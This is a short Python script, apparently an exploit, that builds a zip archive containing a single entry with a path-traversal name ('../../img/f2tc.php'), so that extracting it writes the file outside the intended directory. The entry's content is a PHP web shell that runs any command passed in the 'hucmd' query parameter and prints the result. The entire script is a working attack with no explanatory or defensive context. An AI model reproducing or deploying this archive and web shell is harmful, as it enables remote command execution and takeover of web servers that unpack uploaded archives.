import zipfile

z_info = zipfile.ZipInfo(r"../../img/f2tc.php")
z_file = zipfile.ZipFile("f2tc.zip", mode="w")
z_file.writestr(z_info, "<?php if (!empty($_GET['hucmd'])) { echo '<pre>'. shell_exec($_GET['hucmd']) .'</pre>'; } ?>");
z_file.close()

